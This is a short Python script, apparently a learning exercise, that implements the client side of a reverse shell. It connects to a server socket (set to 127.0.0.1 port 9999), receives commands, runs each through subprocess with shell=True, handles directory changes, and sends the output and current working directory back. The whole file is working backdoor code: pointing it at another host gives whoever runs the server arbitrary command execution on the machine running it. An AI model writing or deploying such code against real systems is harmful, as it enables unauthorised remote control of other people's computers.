import socket
import os
import subprocess

s = socket.socket()
host = '127.0.0.1'  # Local connection
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)  # Receive data (commands) from the server
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))  # Change directory

    if len(data) > 0:
        # Run the command on the client system
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()  # Get output (stdout + stderr)
        output_str = str(output_byte, "utf-8")  # Decode byte output to string
        currentWD = os.getcwd() + "> "  # Get the current working directory
        s.send(str.encode(output_str + currentWD))  # Send output and working directory back to server

        # Display output on the client side (this was missing)
        print(output_str)  # Add this line to show the output on the client side
